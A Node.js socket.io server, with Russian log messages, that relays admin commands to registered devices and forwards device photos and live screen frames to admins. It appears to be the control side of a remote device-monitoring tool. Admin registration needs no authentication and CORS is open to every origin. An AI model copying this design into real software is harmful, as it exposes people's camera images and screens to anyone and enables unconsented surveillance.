const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(express.static(path.join(__dirname, 'public')));

const devices = new Map();
let admins = [];

io.on('connection', (socket) => {
  console.log('Новое подключение:', socket.id);

  socket.on('register-admin', () => {
    admins.push(socket.id);
    console.log('Админ зарегистрирован:', socket.id);
    devices.forEach((device, deviceId) => {
      socket.emit('device-connected', {
        id: deviceId,
        info: device.info,
        online: device.online
      });
    });
  });

  socket.on('register-device', (data) => {
    const { deviceId, info } = data;
    console.log('Регистрация устройства:', deviceId, info);

    const existing = devices.get(deviceId);
    if (existing) {
      existing.socketId = socket.id;
      existing.online = true;
      existing.lastSeen = Date.now();
      existing.info = info;
    } else {
      devices.set(deviceId, {
        socketId: socket.id,
        info: info,
        online: true,
        lastSeen: Date.now()
      });
    }

    admins.forEach(adminId => {
      io.to(adminId).emit('device-connected', {
        id: deviceId,
        info: info,
        online: true
      });
    });
  });

  socket.on('command', (data) => {
    const { targetDeviceId, command, params } = data;
    console.log(`Команда от админа ${socket.id} к ${targetDeviceId}: ${command}`);

    const device = devices.get(targetDeviceId);
    if (device && device.online) {
      io.to(device.socketId).emit('command', { command, params });
    } else {
      socket.emit('command-error', { targetDeviceId, message: 'Device is offline' });
    }
  });

  socket.on('photo', (photoData) => {
    const { deviceId, image } = photoData;
    console.log('Фото от устройства:', deviceId);
    admins.forEach(adminId => {
      io.to(adminId).emit('photo', { deviceId, image });
    });
  });

  // Трансляция экрана
  socket.on('stream-frame', (frameData) => {
    const { deviceId, image } = frameData;
    console.log(`Кадр трансляции от устройства: ${deviceId}, размер: ${image.length}`);
    admins.forEach(adminId => {
      io.to(adminId).emit('stream-frame', { deviceId, image });
    });
  });

  socket.on('disconnect', () => {
    console.log('Отключился:', socket.id);

    let disconnectedDeviceId = null;
    for (let [deviceId, device] of devices.entries()) {
      if (device.socketId === socket.id) {
        device.online = false;
        device.lastSeen = Date.now();
        disconnectedDeviceId = deviceId;
        break;
      }
    }

    if (disconnectedDeviceId) {
      admins.forEach(adminId => {
        io.to(adminId).emit('device-disconnected', { id: disconnectedDeviceId });
      });
    }

    admins = admins.filter(id => id !== socket.id);
  });
});

setInterval(() => {
  const now = Date.now();
  for (let [deviceId, device] of devices.entries()) {
    if (!device.online && now - device.lastSeen > 24 * 60 * 60 * 1000) {
      devices.delete(deviceId);
      console.log('Удалено старое офлайн-устройство:', deviceId);
    }
  }
}, 60 * 60 * 1000);

server.listen(3000, () => {
  console.log('Сервер запущен на порту 3000');
});